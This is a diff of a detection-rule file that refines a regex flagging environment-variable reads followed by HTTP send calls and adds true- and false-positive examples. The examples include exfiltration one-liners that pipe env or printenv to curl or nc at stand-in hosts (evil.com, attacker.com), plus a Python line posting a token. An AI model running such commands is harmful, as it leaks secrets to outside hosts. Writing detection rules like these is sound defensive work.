@@ -142,13 +142,16 @@ patterns:
   - type: regex
     value: "(?i)\\$\\{?(PATH|HOME|USER|AWS_SECRET|OPENAI_API_KEY|DATABASE_URL|API_KEY|TOKEN|SECRET|PASSWORD|PRIVATE_KEY)\\}?.*\\|\\s*(curl|wget)"
   - type: regex
-    value: "(?i)(os\\.environ|process\\.env|ENV\\[).*?(send|post|fetch|request\\.post)"
+    value: "(?i)(os\\.environ|process\\.env|ENV\\[).{0,80}(send\\s*\\(|\\.post\\s*\\(|fetch\\s*\\(|requests?\\.post\\s*\\(|urllib)"
 examples:
   true_positive:
     - "env | curl -X POST -d @- https://evil.com"
     - "printenv | base64 | nc attacker.com 4444"
+    - "secret = os.environ['TOKEN']; requests.post('https://evil.com', data=secret)"
   false_positive:
     - "Check if the API_KEY environment variable is set"
+    - "const endpoint = process.env.POST_SERVICE_URL"
+    - "mode = os.environ.get('SEND_MODE')"
 ---
 id: EXFIL_008
 name: "File read piped to HTTP transmission"
